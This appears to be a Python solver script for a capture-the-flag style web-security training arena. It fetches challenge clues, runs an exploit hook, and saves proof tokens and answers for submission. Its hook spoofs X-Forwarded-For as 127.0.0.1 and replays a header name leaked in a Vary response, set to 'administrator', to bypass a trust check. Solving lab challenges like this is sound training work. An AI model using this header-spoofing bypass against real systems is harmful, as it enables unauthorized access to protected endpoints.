#!/usr/bin/env python3
"""Shared all-mode web solver, automatically copied into each worker directory.

After `python3 tools/wk.py begin <mode>`, edit only `rec_this_family()` below, then:

    python3 solve.py single_solve
    python3 tools/wk.py submit single_solve

Reuse the same file for time_trial and mastery. It supplies the scoped HTTP client,
canonical recoverers, question/target mapping, evidence capture, strict answer IDs,
and attempt-bound partial-answer reuse. Do not write another HTTP client or a
separate mastery classifier.

`rec_this_family` must check the current target's clue shape before making requests
and return None on a mismatch. This matters in mastery, where every target can be a
different bug class. Canonical recovery runs after the local hook returns None.

Answers recovered by the driver's first pass are reused only when answers.meta.json
matches the current attempt_id and target URLs. A changed attempt or target therefore
forces fresh derivation instead of accidentally reusing stale proofs.
"""
import json
import re
import sys
import urllib.error
import urllib.request
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
RECOVERY_DIR = SCRIPT_DIR / "solver_py_scripts"
if not RECOVERY_DIR.is_dir():
    RECOVERY_DIR = SCRIPT_DIR.parent  # running from solver_py_scripts/web_templates
sys.path.insert(0, str(RECOVERY_DIR))
from recovery_lib import Target, classify_and_recover  # noqa: E402



PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


def _get_with_headers(t, path, headers, save):
    """Like Target.get, but also returns the response headers (Target.request
    discards them) - needed to read the Vary-disclosed header name below."""
    url = t.base + path
    req = urllib.request.Request(
        url, headers={"User-Agent": "Mozilla/5.0", **headers}, method="GET")
    try:
        with t.opener.open(req, timeout=30) as resp:
            status, resp_headers, body = resp.status, resp.headers, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        status, resp_headers, body = err.code, err.headers, err.read().decode("utf-8", "replace")
    t._save(save, status, body)
    return status, resp_headers, body


def rec_this_family(t, clues):
    """Two-stage trust boundary (curriculum day 30 - "Framework Roulette").

    `feature_route` present, no `secondary_route`/`deployment` key. Stage 1 is an
    IP trust check: GET feature_route with `X-Forwarded-For: 127.0.0.1` (the
    exact literal - other loopback-looking strings do not flip it). Some apps in
    this family (e.g. Django, no `component_route` clue key) accept that alone
    and return `ok:true` immediately.

    Others (e.g. ASP.NET Core Blazor Server, `component_route` present in clues)
    gate a second check behind a per-attempt, randomly-named header
    (`x-arena-<6 hex>`) that is never disclosed anywhere except the `Vary`
    response header of the stage-1 403. Re-request with that exact header name
    set to `administrator` (not `staff` - the error says `policy: staff_only`
    but that literal string still rejects) alongside the same X-Forwarded-For.

    Source: day-30-framework-roulette (curriculum day 30, release day 31) - this
    family's own bug."""
    feature = clues.get("feature_route")
    if not feature or clues.get("secondary_route") or clues.get("deployment"):
        return None
    status, headers, body = _get_with_headers(
        t, feature, {"X-Forwarded-For": "127.0.0.1"}, save="trust_boundary_stage1")
    if status == 200:
        match = PROOF_RE.search(body)
        return match.group(0) if match else None
    vary = headers.get("Vary")
    if not vary:
        return None
    status, _, body = _get_with_headers(
        t, feature, {"X-Forwarded-For": "127.0.0.1", vary: "administrator"},
        save="trust_boundary_stage2")
    if status == 200:
        match = PROOF_RE.search(body)
        return match.group(0) if match else None
    return None


def solve_target(t, prompt=""):
    """Try the local family hook, then canonical recovery, reusing initial recon."""
    evidence = {}
    root_status, html = t.get("/", save="root")
    clues_status, clues_body = t.get("/api/clues", save="clues")
    try:
        clues = json.loads(clues_body) if clues_status == 200 else {}
    except (TypeError, ValueError):
        clues = {}
    evidence["root_status"] = root_status
    if clues:
        evidence["clues"] = clues
    proof = rec_this_family(t, clues)
    if proof:
        evidence["classification"] = "this family's own class"
        return proof, evidence
    initial = {"/": (root_status, html), "/api/clues": (clues_status, clues_body)}
    proof = classify_and_recover(t, evidence, prompt, initial=initial)
    return proof, evidence


def current_targets(start):
    return {t["id"]: t["url"] for t in start.get("targets", [])
            if isinstance(t, dict) and t.get("id") and t.get("url")}


def load_reusable_answers(mode_dir, start):
    """Load only first-pass answers bound to this exact attempt and target assignment."""
    try:
        meta = json.loads((mode_dir / "answers.meta.json").read_text())
        raw = json.loads((mode_dir / "answers.json").read_text())
    except (OSError, ValueError):
        return {}
    if meta.get("attempt_id") != start.get("attempt_id"):
        return {}
    if meta.get("targets") != current_targets(start):
        return {}
    answers = raw.get("answers", raw) if isinstance(raw, dict) else {}
    allowed = set(start.get("answer_ids") or [])
    return {qid: value for qid, value in answers.items()
            if qid in allowed and isinstance(value, str)}


def save_answers(mode_dir, start, answers):
    (mode_dir / "answers.json").write_text(
        json.dumps({"answers": answers}, indent=2) + "\n")
    (mode_dir / "answers.meta.json").write_text(json.dumps({
        "attempt_id": start.get("attempt_id"),
        "targets": current_targets(start),
    }, indent=2) + "\n")


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <mode>  (single_solve | time_trial | mastery)",
              file=sys.stderr)
        return 2
    mode = sys.argv[1]
    mode_dir = SCRIPT_DIR / mode
    start = json.loads((mode_dir / "start.json").read_text())
    targets_by_id = current_targets(start)
    prompt = start.get("prompt", "")

    answers = load_reusable_answers(mode_dir, start)
    if answers:
        print(f"reusing {len(answers)} answer(s) from the current attempt", file=sys.stderr)
    all_evidence = {}
    for question in start.get("questions", []):
        qid, target_id = question["id"], question.get("artifact")
        if qid in answers:
            continue
        url = targets_by_id.get(target_id)
        if not url:
            print(f"{qid}: no target url for artifact {target_id!r}", file=sys.stderr)
            continue
        evidence_dir = mode_dir / "evidence" / str(target_id).replace(" ", "_")
        t = Target(url, evidence_dir)
        proof, evidence = solve_target(t, prompt)
        all_evidence[qid] = {"target": target_id, "url": url, **evidence}
        print(f"{qid} [{target_id}] class={evidence.get('classification')} -> {proof}",
              file=sys.stderr)
        if proof:
            answers[qid] = proof

    missing = [q["id"] for q in start.get("questions", []) if q["id"] not in answers]
    mode_dir.mkdir(parents=True, exist_ok=True)
    save_answers(mode_dir, start, answers)
    (mode_dir / "solver-evidence.json").write_text(json.dumps(all_evidence, indent=2) + "\n")
    if missing:
        print(f"missing proofs for: {missing} - fill in rec_this_family() and re-run",
              file=sys.stderr)
        return 1
    print(f"wrote {mode_dir / 'answers.json'} - now run: python3 tools/wk.py submit {mode}",
          file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
